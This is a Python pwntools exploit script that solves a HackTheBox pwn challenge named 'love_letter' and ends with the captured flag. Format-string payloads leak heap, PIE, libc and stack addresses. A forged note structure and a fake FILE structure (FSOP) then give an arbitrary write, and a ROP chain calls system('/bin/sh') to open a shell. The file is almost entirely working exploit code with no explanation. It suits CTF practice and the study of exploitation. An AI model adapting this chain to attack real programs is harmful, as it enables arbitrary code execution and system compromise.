#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
brva 0x0176D
continue
"""
# brva 0x0176D
# brva 0x1C86
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./love_letter_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

def create(name, data, have_password=0, password=0):   
    sla(b"Choice: ", b"1")
    sla(b"> ", name)
    sla(b"> ", data)
    if have_password:
        sla(b"> ", b"y")
        sla(b"> ", password)
    else:
        sla(b"> ", b"n")

def change(idx, name):
    sla(b"Choice: ", b"2")
    sla(b"> ", str(idx).encode())
    sla(b"Author: ", name)

def printn(idx):
    sla(b"Choice: ", b"3")
    sla(b"> ", str(idx).encode())

def delete(idx):
    sla(b"Choice: ", b"4")
    sla(b"> ", str(idx).encode())


io = start()

# Fmt string leak address heap - pie - libc - canary
create(b"%7$p", b"A" * 0xe8 + p64(0x71))
create(b"%11$p", b"B" * 8)
create(b"%15$p", b"C" * 8)
create(b"%8$p", b"D" * 8)

printn(1)
recvunt(b"Author: ")
heap = int(io.recvline().decode(), 16) - 0x2a0

printn(2)
recvunt(b"Author: ")
pie_leak = int(io.recvline().decode(), 16)
elf.address = pie_leak - 0x1e92

printn(3)
recvunt(b"Author: ")
libc_leak = int(io.recvline().decode(), 16)
libc.address = libc_leak - 0x29d90

printn(4)
recvunt(b"Author: ")
stack = int(io.recvline().decode(), 16)

info("Heap base: " + hex(heap))
info("PIE base: " + hex(elf.address))
info("Libc base: " + hex(libc.address))
info("Stack: " + hex(stack))

address_heap_array = elf.address + 0x4060

fake_note_struct = flat(
    heap + 0x2d0,
    0,
    0,
    stack + 0x8
    )
create(b'X' * 4, fake_note_struct)



payload = flat(
    b"1" * 0x20,
    address_heap_array
    )

payload = payload.ljust(0x108, b"\00") + p64(0x1e1)

fp = FileStructure()
fake_fp = fp.read(heap + 0x3e0, 1000)

payload += fake_fp

sla(b"Choice: ", b"5")
sla(b"> ", payload)


change(2, p64(heap + 0x870)[:-2])
change(1, b'A' * 2)

pop_rdi = libc.address + 0x000000000002a3e5 #: pop rdi ; ret

payload = flat(
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    pop_rdi + 1,
    libc.sym.system
    )
sla(b"Content: ", payload)
io.interactive()
#HTB{1ll_t4k3_u_2_th3_fs0p_my_cut3_pr1nc355}
